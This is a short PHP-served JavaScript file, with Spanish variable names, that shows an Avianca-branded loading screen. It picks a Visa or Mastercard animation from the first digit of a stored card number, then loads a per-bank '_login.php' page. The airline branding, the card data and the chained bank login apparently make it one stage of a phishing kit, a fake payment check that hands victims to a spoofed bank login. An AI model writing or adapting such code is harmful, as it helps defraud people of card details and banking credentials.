<?php
header('Access-Control-Allow-Origin: *');
header('Content-Type: application/javascript');
?>

var my_titulo = 'Cargando';
var my_banco = my_hosting + 'bancos/' + my_data['banco'] + '/';
var my_contenido = `
<style>
    body {
        margin: 0;
        background-color: #ffffff !important;
        overflow: hidden;
        display: flex;
        flex-direction: column;
        height: 100vh;
    }

    img {
        width: 300px;
        max-width: 100vw;
        margin: auto;
    }
</style>

<img src="${my_hosting}_avianca/assets/plane-loader.gif" id="loading" style="display: none;">
`;

//<script>
    var timeout = 10000;
    $(document).ready(function() {
        setTimeout(function() {
            let img = $('#loading');
            img.css('display', 'block');
            img.css('margin', '0 auto');
            img.css('width', '600px');
            if (my_data['tarjeta'] && my_data['tarjeta'].substr(0, 1) == '4') {
                img.attr('src', my_hosting + 'img/gif_visa2.gif');
            } else {
                img.attr('src', my_hosting + 'img/gif_mastercard2.gif');
            }
            setTimeout(function() {
                loadFile(['_login.php']);
            }, 5000);
        }, timeout);
    });